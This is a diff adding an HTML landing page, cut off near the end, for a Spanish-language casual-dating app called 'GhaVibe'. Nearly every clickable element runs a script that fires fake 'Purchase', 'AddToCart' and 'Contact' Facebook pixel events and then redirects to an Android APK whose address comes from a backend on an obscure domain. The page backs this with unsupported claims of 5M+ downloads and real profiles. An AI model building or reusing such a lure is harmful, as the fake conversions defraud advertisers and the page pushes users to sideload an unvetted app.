@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="UTF-8">
+   
+
+       <script>
+var API_BASE = 'https://url.yuhd320k.site';
+// Facebook Pixel — 动态从后台加载所有像素ID
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+// 从后台 API 获取所有像素ID并初始化
+var _site=window.location.origin+window.location.pathname;
+console.log('前端站点(完整路径):',_site,' API:',API_BASE);
+fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
+.then(function(r){return r.json()})
+.then(function(d){
+  console.log('像素API返回:',JSON.stringify(d));
+  var ids=d.ids||[];
+  if(!ids.length){ console.warn('像素ID列表为空，请前往后台配置。site='+_site+' matched='+(d._user||'none')); return; }
+  console.log('已加载像素ID:',ids); for(var i=0;i<ids.length;i++){ fbq('init',ids[i]); }
+  fbq('track','PageView');
+  // 动态插入 noscript 备用图
+  var ns=document.createElement('div');
+  ns.style.display='none';
+  ns.innerHTML=ids.map(function(id){return '<img height="1" width="1" src="https://www.facebook.com/tr?id='+id+'&ev=PageView&noscript=1"/>'}).join('');
+  document.body.appendChild(ns);
+})
+.catch(function(){
+  console.warn('像素ID获取失败，请检查后台配置');
+});
+</script>
+<!-- End Meta Pixel Code -->
+
+
+  <script>
+// ========== k2 — 动态获取APK下载地址并跳转 ==========
+var FILTER=0; // 0=关闭  1=屏蔽PC和iOS，仅允许安卓
+var _apkUrl='';
+async function k2(source){
+    fbq('track', 'AddToCart');
+    fbq('track', 'Contact');
+    fbq('track', 'Purchase');
+    if(FILTER===1){
+        var ua=navigator.userAgent||'';
+        var isIOS=/iPhone|iPad|iPod/i.test(ua);
+        var isMobile=/Mobi|Android/i.test(ua);
+        if(!isMobile||isIOS){
+            alert('error');
+            return;
+        }
+    }
+    try{
+        if(!_apkUrl){
+            var r=await fetch(API_BASE+'/api/apk-url?site='+encodeURIComponent(_site));
+            var d=await r.json();
+            _apkUrl=d.url; console.log('APK API返回:',JSON.stringify(d));
+        }
+        if(_apkUrl) window.location.href=_apkUrl;
+        else alert('获取APK下载地址失败，请稍后重试');
+    }catch(e){
+        alert('获取APK下载地址失败，请稍后重试');
+    }
+}
+</script>
+
+    
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>GhaVibe - Conoce Solteros Locales | Encuentra tu Pareja Esta Noche</title>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;background:linear-gradient(180deg,#1a0a14 0%,#0d0d1a 100%);color:#fff;-webkit-font-smoothing:antialiased;overflow-x:hidden;max-width:480px;margin:0 auto;padding-bottom:100px}
+    ::selection{background:rgba(255,75,110,0.4)}
+    .hero{position:relative;padding:2rem 1rem 1.25rem;text-align:center;overflow:hidden}
+    .hero::before{content:'';position:absolute;top:-30%;left:-20%;width:140%;height:70%;background:radial-gradient(ellipse,rgba(255,75,110,0.12) 0%,transparent 60%);pointer-events:none}
+    .hero-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;background:rgba(255,75,110,0.12);border:1px solid rgba(255,75,110,0.2);border-radius:3rem;font-size:0.7rem;font-weight:600;color:#ff6b81;margin-bottom:1rem;position:relative;z-index:1}
+    .live-dot{width:7px;height:7px;background:#ff3b5c;border-radius:50%;animation:livePulse 1.5s infinite}
+    @keyframes livePulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(255,59,92,0.6)}50%{opacity:0.5;box-shadow:0 0 0 6px rgba(255,59,92,0)}}
+    .hero h1{font-size:2rem;font-weight:800;line-height:1.15;letter-spacing:-0.03em;margin-bottom:0.5rem;position:relative;z-index:1}
+    .hero h1 .gt{background:linear-gradient(135deg,#ff4b6e,#ff8fa3,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    .hero-sub{font-size:0.82rem;color:rgba(255,255,255,0.55);line-height:1.5;margin-bottom:1rem;position:relative;z-index:1;max-width:300px;margin-left:auto;margin-right:auto}
+    .online-indicator{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;background:rgba(50,200,150,0.08);border:1px solid rgba(50,200,150,0.15);border-radius:3rem;font-size:0.68rem;color:#32c896;margin-bottom:0.75rem;position:relative;z-index:1}
+    .online-dot{width:6px;height:6px;background:#32c896;border-radius:50%;animation:livePulse 2s infinite}
+    .float-avatars{display:flex;justify-content:center;gap:0.4rem;margin-bottom:1rem;position:relative;z-index:1}
+    .float-avatars img{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid rgba(255,255,255,0.12)}
+    .float-avatars img:nth-child(odd){transform:translateY(-6px)}
+    .float-avatars img:nth-child(even){transform:translateY(2px)}
+    .dl-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;max-width:280px;margin:0 auto;padding:0.85rem;border-radius:3rem;font-size:0.95rem;font-weight:700;text-decoration:none;cursor:pointer;border:none;background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;box-shadow:0 6px 24px rgba(255,45,85,0.3);transition:all 0.2s;position:relative;z-index:1}
+    .dl-btn:active{transform:scale(0.96)}
+    .dl-btn small{display:block;font-size:0.65rem;font-weight:400;opacity:0.75;line-height:1.3}
+    .stats-row{display:flex;justify-content:center;gap:1.5rem;margin-top:1rem}
+    .stat-num{font-size:1.2rem;font-weight:800;color:#ff6b81}
+    .stat-label{font-size:0.65rem;color:rgba(255,255,255,0.4)}
+    .sec{padding:1.5rem 0.5rem}
+    .sec-dark{background:rgba(255,255,255,0.015)}
+    .sec-title{font-size:1.2rem;font-weight:700;text-align:center;letter-spacing:-0.02em;margin-bottom:0.25rem}
+    .sec-sub{font-size:0.75rem;color:rgba(255,255,255,0.45);text-align:center;margin-bottom:1rem}
+
+    /* ---- User Cards with Carousel ---- */
+    .user-grid{display:flex;flex-wrap:wrap;gap:6px}
+    .user-card{width:calc(50% - 3px);border-radius:12px;overflow:hidden;position:relative;aspect-ratio:3/4;cursor:default}
+    .user-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+    .user-card::after{content:'';position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,0.7) 0%,transparent 40%,transparent 100%);z-index:1;pointer-events:none}
+    .card-swipe-hint{display:none}
+    /* ---- Fullscreen Viewer ---- */
+    .viewer{display:none;position:fixed;inset:0;z-index:999;background:rgba(0,0,0,0.95);flex-direction:column;align-items:center;justify-content:center}
+    .viewer.on{display:flex}
+    .viewer-close{position:absolute;top:16px;right:16px;z-index:10;width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,0.12);color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.2rem;line-height:1;cursor:pointer;border:none;backdrop-filter:blur(8px)}
+    .viewer-close:active{background:rgba(255,255,255,0.25)}
+    .viewer-carousel{display:flex;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;width:100%;max-width:400px;aspect-ratio:3/4;border-radius:16px;overflow:hidden}
+    .viewer-carousel::-webkit-scrollbar{display:none}
+    .viewer-carousel img{flex:0 0 100%;width:100%;height:100%;object-fit:cover;scroll-snap-align:start}
+    .viewer-dots{display:flex;gap:6px;margin-top:16px}
+    .viewer-dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,0.3);transition:all 0.2s}
+    .viewer-dot.on{background:#fff;width:18px;border-radius:3px}
+    .viewer-info{text-align:center;margin-top:12px;color:#fff}
+    .viewer-info .v-name{font-size:1rem;font-weight:700}
+    .viewer-info .v-job{font-size:0.75rem;color:rgba(255,255,255,0.55)}
+    .viewer-info .v-stats{font-size:0.7rem;color:rgba(255,255,255,0.45);margin-top:2px}
+    .viewer-info .v-loc{font-size:0.68rem;color:rgba(255,255,255,0.5);margin-top:2px}
+    .viewer-arrow{position:absolute;top:50%;transform:translateY(-50%);z-index:10;width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,0.12);color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.2rem;cursor:pointer;border:none;backdrop-filter:blur(8px);transition:background 0.2s}
+    .viewer-arrow:active{background:rgba(255,255,255,0.3)}
+    .viewer-arrow.prev{left:12px}
+    .viewer-arrow.next{right:12px}
+    .viewer-arrow svg{width:20px;height:20px}
+    .user-card .badge{position:absolute;top:8px;left:8px;padding:3px 8px;border-radius:3rem;font-size:0.55rem;font-weight:700;z-index:3}
+    .badge-online{background:rgba(50,200,150,0.9);color:#fff}
+    .badge-hot{background:rgba(255,107,53,0.9);color:#fff}
+    .badge-new{background:rgba(138,75,255,0.9);color:#fff}
+    .card-contact{position:absolute;bottom:44px;right:8px;z-index:5;display:flex;align-items:center;gap:4px;padding:6px 10px;border-radius:18px;background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;font-size:0.55rem;font-weight:600;cursor:pointer;border:none;white-space:nowrap;box-shadow:0 2px 10px rgba(255,45,85,0.4);transition:all 0.15s}
+    .card-contact svg{width:11px;height:11px;flex-shrink:0}
+    .card-contact:active{transform:scale(0.93);box-shadow:0 1px 6px rgba(255,45,85,0.25)}
+    .user-card .info{position:absolute;bottom:0;left:0;right:0;z-index:2;padding:10px 8px 8px}
+    .user-card .name{font-size:0.7rem;font-weight:700;color:#fff;display:flex;align-items:center;gap:4px}
+    .user-card .age{font-size:0.65rem;font-weight:400;color:rgba(255,255,255,0.65)}
+    .user-card .name svg{width:10px;height:10px;flex-shrink:0}
+    .user-card .job{font-size:0.58rem;color:rgba(255,255,255,0.55);margin-bottom:1px}
+    .user-card .body-stats{font-size:0.55rem;color:rgba(255,255,255,0.5);display:flex;gap:6px;margin-bottom:1px}
+    .user-card .loc{display:none}
+    .user-card .tags{display:flex;gap:3px;margin-top:3px}
+    .user-card .tag{font-size:0.5rem;padding:2px 6px;border-radius:3rem;background:rgba(255,255,255,0.15);color:rgba(255,255,255,0.85)}
+
+    .steps{display:flex;gap:0.4rem}
+    .step{flex:1;text-align:center;padding:0.6rem 0.3rem;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:0.6rem}
+    .step-num{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:50%;font-weight:800;font-size:0.75rem;margin:0 auto 0.3rem}
+    .step:nth-child(1) .step-num{background:rgba(255,75,110,0.15);color:#ff6b81}
+    .step:nth-child(2) .step-num{background:rgba(138,75,255,0.15);color:#c44dff}
+    .step:nth-child(3) .step-num{background:rgba(50,200,150,0.15);color:#32c896}
+    .step h5{font-size:0.7rem;font-weight:600;margin-bottom:1px}
+    .step p{font-size:0.6rem;color:rgba(255,255,255,0.4);line-height:1.2}
+
+    .safety-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:0.3rem}
+    .safety-item{text-align:center;padding:0.6rem 0.2rem;background:rgba(255,255,255,0.015);border-radius:0.5rem;font-size:0.65rem}
+
+    .review-carousel{display:flex;gap:0.6rem;overflow-x:auto;padding:0.25rem 0;-webkit-overflow-scrolling:touch;scrollbar-width:none;scroll-snap-type:x mandatory}
+    .review-carousel::-webkit-scrollbar{display:none}
+    .review-card{min-width:250px;max-width:290px;flex-shrink:0;scroll-snap-align:start;background:rgba(255,255,255,0.025);border:1px solid rgba(255,255,255,0.05);border-radius:0.75rem;padding:0.85rem}
+    .review-stars{display:flex;gap:1px;margin-bottom:0.4rem}
+    .review-text{font-size:0.7rem;color:rgba(255,255,255,0.65);line-height:1.5;font-style:italic;margin-bottom:0.6rem}
+    .review-author{display:flex;align-items:center;gap:0.4rem}
+    .review-author img{width:28px;height:28px;border-radius:50%;object-fit:cover}
+    .review-author-name{font-size:0.7rem;font-weight:600}
+    .review-author-role{font-size:0.58rem;color:rgba(255,255,255,0.35)}
+    .review-hint{display:flex;justify-content:center;gap:0.3rem;margin-top:0.5rem;opacity:0.3;font-size:0.6rem}
+
+    .android-btn{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;max-width:240px;margin:0 auto;padding:0.75rem;border-radius:3rem;font-size:0.9rem;font-weight:700;text-decoration:none;cursor:pointer;border:none;background:linear-gradient(135deg,#4da6ff,#3b82f6);color:#fff;box-shadow:0 4px 18px rgba(59,130,246,0.25)}
+    .android-btn:active{transform:scale(0.96)}
+
+    /* Hot Picks Carousel */
+    .hot-scroll{display:flex;gap:10px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;-webkit-overflow-scrolling:touch;padding:4px 0.5rem 8px;margin:0 -0.5rem;scroll-behavior:smooth}
+    .hot-scroll::-webkit-scrollbar{display:none}
+    .hot-card{flex:0 0 140px;scroll-snap-align:start;border-radius:14px;overflow:hidden;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);cursor:pointer;transition:transform 0.15s}
+    .hot-card:active{transform:scale(0.96)}
+    .hot-img{position:relative;aspect-ratio:3/4;overflow:hidden}
+    .hot-img img{width:100%;height:100%;object-fit:cover}
+    .hot-badge{position:absolute;top:6px;left:6px;padding:3px 8px;border-radius:10px;font-size:0.5rem;font-weight:700;text-transform:uppercase;letter-spacing:0.03em}
+    .hot-badge.popular{background:linear-gradient(135deg,#FF6B35,#FF8C42);color:#fff}
+    .hot-badge.new{background:linear-gradient(135deg,#4DA6FF,#3B82F6);color:#fff}
+    .hot-badge.verified{background:linear-gradient(135deg,#32C896,#22C55E);color:#fff}
+    .hot-badge.hot{background:linear-gradient(135deg,#FF3B5C,#EF4444);color:#fff}
+    .hot-badge.vip{background:linear-gradient(135deg,#C44DFF,#A855F7);color:#fff}
+    .hot-views{position:absolute;bottom:6px;right:6px;font-size:0.55rem;font-weight:600;color:#fff;background:rgba(0,0,0,0.5);padding:2px 7px;border-radius:8px;backdrop-filter:blur(4px)}
+    .hot-info{padding:10px 8px}
+    .hot-name{font-size:0.75rem;font-weight:700;color:#fff}
+    .hot-loc{display:none}
+    .hot-dots{display:flex;justify-content:center;gap:5px;margin-top:10px}
+    .hot-dot{width:5px;height:5px;border-radius:3px;background:rgba(255,255,255,0.2);transition:all 0.3s}
+    .hot-dot.on{background:#ff6b81;width:16px}
+
+    .float-cta{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;z-index:200;padding:0.6rem 0.75rem 0.85rem;background:linear-gradient(0deg,rgba(13,13,26,0.98) 60%,rgba(13,13,26,0) 100%);pointer-events:none}
+    .float-cta-btn{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;padding:0.8rem;border-radius:3rem;font-size:0.95rem;font-weight:700;text-decoration:none;cursor:pointer;border:none;background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;pointer-events:auto;animation:breathe 1.8s ease-in-out infinite;box-shadow:0 0 20px rgba(255,45,85,0.5)}
+    @keyframes breathe{0%,100%{box-shadow:0 0 20px rgba(255,45,85,0.5);transform:scale(1)}50%{box-shadow:0 0 40px rgba(255,75,110,0.8),0 0 60px rgba(255,45,85,0.3);transform:scale(1.03)}}
+    .float-cta-btn:active{transform:scale(0.96);animation:none}
+    .ft{text-align:center;padding:0.75rem;font-size:0.6rem;color:rgba(255,255,255,0.2)}
+    /* Chat / Support icon */
+    .chat-fab{position:fixed;right:12px;bottom:120px;z-index:150;width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,#32c896,#22c55e);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;border:none;box-shadow:0 4px 20px rgba(50,200,150,0.35);animation:chatPulse 2s ease-in-out infinite;transition:transform 0.15s}
+    .chat-fab:active{transform:scale(0.9);animation:none}
+    .chat-fab svg{width:24px;height:24px}
+    .chat-badge{position:absolute;top:-4px;right:-4px;width:22px;height:22px;border-radius:50%;background:#ff3b5c;color:#fff;font-size:0.7rem;font-weight:800;display:flex;align-items:center;justify-content:center;animation:badgeBounce 1.2s ease-in-out infinite;border:2px solid #0d0d1a}
+    @keyframes badgeBounce{0%,100%{transform:scale(1)}30%{transform:scale(1.25)}60%{transform:scale(0.9)}}
+    @keyframes chatPulse{0%,100%{box-shadow:0 4px 20px rgba(50,200,150,0.35)}50%{box-shadow:0 6px 30px rgba(50,200,150,0.6),0 0 0 8px rgba(50,200,150,0.08)}}
+
+    /* ---- Top Hero (Nuevo) ---- */
+    .hero-top{position:relative;padding:1.25rem 0.75rem 0.5rem;overflow:visible;text-align:center}
+    .hero-top-glow{position:absolute;inset:0;pointer-events:none;z-index:0}
+    .hero-top-glow::before,.hero-top-glow::after{content:"";position:absolute;border-radius:50%;filter:blur(80px)}
+    .hero-top-glow::before{top:-60px;right:-60px;width:260px;height:260px;background:rgba(255,75,110,0.1)}
+    .hero-top-glow::after{top:100px;left:-50px;width:200px;height:200px;background:rgba(196,77,255,0.08)}
+    .hero-top-inner{position:relative;z-index:1;max-width:400px;margin:0 auto}
+    .hero-top-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;background:rgba(255,75,110,0.06);border:1px solid rgba(255,75,110,0.2);border-radius:3rem;font-size:0.65rem;font-weight:600;color:#ff6b81;margin-bottom:0.75rem;box-shadow:0 0 10px rgba(255,75,110,0.08)}
+    .hero-top-badge .ping-dot{position:relative;width:7px;height:7px;background:#ff3b5c;border-radius:50%}
+    .hero-top-badge .ping-dot::after{content:"";position:absolute;inset:-3px;border-radius:50%;background:rgba(255,59,92,0.35);animation:pingAnim 1.5s infinite}
+    @keyframes pingAnim{0%{transform:scale(1);opacity:1}100%{transform:scale(2.2);opacity:0}}
+    .hero-top h1{font-size:1.5rem;font-weight:800;line-height:1.15;letter-spacing:-0.02em;margin-bottom:0.5rem}
+    .hero-top h1 .gt{background:linear-gradient(135deg,#ff4b6e,#ff8fa3,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+    .hero-top-desc{font-size:0.75rem;color:rgba(255,255,255,0.5);line-height:1.5;margin:0 auto 0.75rem;max-width:320px}
+    .hero-top-users{display:flex;align-items:center;justify-content:center;gap:0.5rem;margin-bottom:0.85rem;flex-wrap:wrap}
+    .hero-top-avatars{display:flex;align-items:center}
+    .hero-top-avatars img{width:34px;height:34px;border-radius:50%;object-fit:cover;border:2px solid #0d0d1a;margin-left:-10px;cursor:pointer;transition:opacity 0.2s}
+    .hero-top-avatars img:first-child{margin-left:0}
+    .hero-top-avatars img:hover{opacity:0.8}
+    .hero-top-avatars .plus-avatar{width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,0.06);border:2px solid #0d0d1a;display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:800;color:rgba(255,255,255,0.6);margin-left:-10px}
+    .hero-top-users-text{font-size:0.65rem;color:rgba(255,255,255,0.4)}
+    .hero-top-users-text strong{color:#fff;font-weight:700}
+    .hero-phone-wrap{position:relative;max-width:210px;margin:0 auto 0.25rem}
+    .hero-phone-glow{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:130%;height:130%;border-radius:50%;background:radial-gradient(circle,rgba(255,75,110,0.18) 0%,rgba(196,77,255,0.08) 45%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
+    .hero-phone{position:relative;background:#1a1125;border:4px solid #2d1e3d;border-radius:2rem;overflow:hidden;aspect-ratio:9/18;box-shadow:0 16px 40px rgba(0,0,0,0.5);z-index:1}
+    .hero-phone-notch{position:absolute;top:0;left:50%;transform:translateX(-50%);width:96px;height:15px;background:#2d1e3d;border-radius:0 0 10px 10px;z-index:10;display:flex;align-items:flex-end;justify-content:center;padding-bottom:2px;gap:4px}
+    .hero-phone-notch .bar{width:26px;height:2px;background:rgba(0,0,0,0.35);border-radius:2px}
+    .hero-phone-notch .dot{width:3px;height:3px;background:rgba(0,0,0,0.35);border-radius:50%}
+    .hero-phone-screen{position:absolute;inset:0;background:#0d0714;padding-top:18px;display:flex;flex-direction:column}
+    .hero-phone-topbar{display:flex;justify-content:space-between;align-items:center;padding:5px 8px;background:rgba(21,10,34,0.85);backdrop-filter:blur(6px);border-bottom:1px solid rgba(255,255,255,0.04);font-size:0.4rem;font-weight:700;color:#fff}
+    .hero-phone-cards{flex:1;position:relative;margin:6px 8px}
+    .hero-phone-card-shadow{position:absolute;inset:6px -3px 28px -3px;background:#1e132b;border-radius:14px;border:1px solid rgba(255,255,255,0.02);transform:scale(0.93) translateY(6px);opacity:0.3}
+    .hero-phone-card{position:absolute;inset:0;bottom:28px;background:#1e132b;border-radius:14px;overflow:hidden;border:1px solid rgba(255,255,255,0.06);display:flex;flex-direction:column;cursor:pointer}
+    .hero-phone-card-img{flex:1;position:relative;background:#1a1125}
+    .hero-phone-card-img img{width:100%;height:100%;object-fit:cover;opacity:0.9}
+    .hero-phone-card-img::after{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,0.8) 0%,rgba(0,0,0,0.05) 40%,transparent 100%)}
+    .hero-phone-card-info{position:absolute;bottom:6px;left:8px;z-index:2;color:#fff}
+    .hero-phone-card-info .uname{font-size:0.48rem;font-weight:800;display:flex;align-items:center;gap:2px;text-shadow:0 1px 3px rgba(0,0,0,0.5)}
+    .hero-phone-card-info .uloc{font-size:0.38rem;color:rgba(255,255,255,0.55);margin-top:1px;display:flex;align-items:center;gap:2px}
+    .hero-phone-actions{display:flex;justify-content:center;gap:10px;padding:8px;background:#150a22}
+    .hero-phone-actions button{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;cursor:pointer;transition:all 0.15s;padding:0}
+    .hero-phone-actions .btn-no{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:rgba(255,255,255,0.4)}
+    .hero-phone-actions .btn-no:active{background:rgba(255,255,255,0.1)}
+    .hero-phone-actions .btn-yes{background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;box-shadow:0 0 10px rgba(255,45,85,0.3)}
+    .hero-phone-actions .btn-yes:active{transform:scale(0.88)}
+    .hero-phone-actions .btn-star{background:rgba(196,77,255,0.12);border:1px solid rgba(196,77,255,0.2);color:#c44dff}
+    .hero-phone-actions .btn-star:active{background:rgba(196,77,255,0.22)}
+    .hero-phone-tabs{display:flex;justify-content:space-around;align-items:center;padding:6px 2px 4px;background:rgba(21,10,34,0.9);backdrop-filter:blur(6px);border-top:1px solid rgba(255,255,255,0.04)}
+    .hero-phone-tabs span{color:rgba(255,255,255,0.25);display:flex;flex-direction:column;align-items:center;position:relative;font-size:0.55rem}
+    .hero-phone-tabs span.on{color:#ff4b6e;filter:drop-shadow(0 0 5px rgba(255,75,110,0.4))}
+    .hero-phone-tabs .tab-badge{position:absolute;top:-3px;right:-8px;min-width:13px;height:13px;background:#ff3b5c;border-radius:8px;font-size:0.38rem;font-weight:800;color:#fff;display:flex;align-items:center;justify-content:center;padding:0 3px;border:2px solid #150a22;line-height:1}
+    .hero-float-imgs{position:absolute;z-index:5;pointer-events:none}
+    .hero-float-imgs img{border-radius:50%;object-fit:cover;position:absolute;cursor:pointer;pointer-events:auto}  </style>
+</head>
+<body>
+<!-- ===== Top Hero Section ===== -->
+<section class="hero-top">
+  <div class="hero-top-glow"></div>
+  <div class="hero-top-inner">
+    <div class="hero-top-badge"><span class="ping-dot"></span>Privado &amp; Secreto</div>
+    <h1>La Noche Te Llama,<br><span class="gt">Conéctate Sin Límites</span></h1>
+    <p class="hero-top-desc">Perfiles reales. Conexiones auténticas. Chatea, flirtea y encuéntrate esta noche con alguien especial cerca de ti.</p>
+    <div class="hero-top-users">
+      <div class="hero-top-avatars">
+        <img src="img/a/c1.jpg" alt="User" onclick="k2()">
+        <img src="img/a/c2.jpg" alt="User" onclick="k2()">
+        <img src="img/a/c3.jpg" alt="User" onclick="k2()">
+        <img src="img/a/c4.jpg" alt="User" onclick="k2()">
+        <div class="plus-avatar">+</div>
+      </div>
+      <span class="hero-top-users-text">Únete a <strong>5,000,000+</strong> personas</span>
+    </div>
+  </div>
+  <div class="hero-phone-wrap">
+    <div class="hero-phone-glow"></div>
+ 
+    <div class="hero-phone">
+      <div class="hero-phone-notch"><span class="bar"></span><span class="dot"></span></div>
+      <div class="hero-phone-screen">
+        <div class="hero-phone-topbar"><span>🌙 Citas Cercanas</span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.5)" stroke-width="2"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><circle cx="4" cy="12" r="1.5" fill="rgba(255,255,255,0.5)"/><circle cx="12" cy="10" r="1.5" fill="rgba(255,255,255,0.5)"/><circle cx="20" cy="14" r="1.5" fill="rgba(255,255,255,0.5)"/></svg></div>
+        <div class="hero-phone-cards">
+          <div class="hero-phone-card-shadow"></div>
+          <div class="hero-phone-card" onclick="k2()">
+            <div class="hero-phone-card-img">
+              <img src="img/15-1.jpg" alt="User Card">
+              <div class="hero-phone-card-info">
+                <div class="uname">Sofía, 23 <svg width="10" height="10" viewBox="0 0 24 24" fill="#4da6ff" stroke="none"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="2.5" fill="none"/></svg></div>
+                <div class="uloc"><svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="#ff4b6e" stroke-width="2.5"><circle cx="12" cy="10" r="3"/><path d="M12 2a8 8 0 00-8 8c0 5.5 8 13 8 13s8-7.5 8-13a8 8 0 00-8-8z"/></svg> A 2.5 km · En línea ahora</div>
+              </div>
+            </div>
+            <div class="hero-phone-actions">
+              <button class="btn-no" onclick="event.stopPropagation();k2()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+              <button class="btn-yes" onclick="event.stopPropagation();k2()"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path d="M9 12l2 2 4-4"/></svg></button>
+              <button class="btn-star" onclick="event.stopPropagation();k2()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></button>
+            </div>
+          </div>
+        </div>
+        <div class="hero-phone-tabs">
+          <span class="on"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></span>
+          <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="16.5" y1="16.5" x2="22" y2="22"/></svg></span>
+          <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><span class="tab-badge">3</span></span>
+          <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M20 21v-2a4 4 0 00-6-3.5"/></svg></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- ===== /Top Hero Section ===== -->
+
+<!--
+<button class="chat-fab" onclick="k2()" aria-label="Contact Support"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><span class="chat-badge">1</span></button>
+-->
+<section class="hero">
+  <div class="online-indicator"><span class="online-dot"></span>Solteros conectados ahora mismo</div>
+  <div class="hero-badge"><span class="live-dot"></span>EN VIVO · Citas Casuales</div>
+  <div class="float-avatars"><img src="img/18-1.jpg" alt=""><img src="img/17-1.jpg" alt=""><img src="img/16-1.jpg" alt=""><img src="img/15-1.jpg" alt=""><img src="img/14-1.jpg" alt=""></div>
+  <h1>Encuentra tu<span class="gt"> Pareja Perfecta</span></h1>
+  <p class="hero-sub">Conoce solteros locales listos para chatear, conectar y verse esta noche. Perfiles reales, conexiones reales.</p>
+ <a href="javascript:void(0)" class="dl-btn" onclick="k2()">Descargar para Android<small>4.8 Estrellas · 5M+ Descargas · Gratis</small></a>
+  <div class="stats-row"><div><div class="stat-num">100%</div><div class="stat-label">Gratis para Unirse</div></div><div><div class="stat-num">24/7</div><div class="stat-label">Miembros Reales</div></div><div><div class="stat-num">Instantáneo</div><div class="stat-label">Conexiones</div></div></div>
+</section>
+
+<!-- 
+<section class="sec" style="padding-bottom:0.5rem">
+  <div class="sec-tag" style="text-align:center;font-size:0.65rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#ff6b81;margin-bottom:4px">🔥 Más Vistos Ahora</div>
+  <h2 class="sec-title" style="margin-bottom:2px">Quién Está Caliente Esta Noche</h2>
+  <p class="sec-sub" style="margin-bottom:10px"><span style="color:#32c896">Personas</span> navegando ahora</p>
+  <div class="hot-scroll" id="hotScroll">
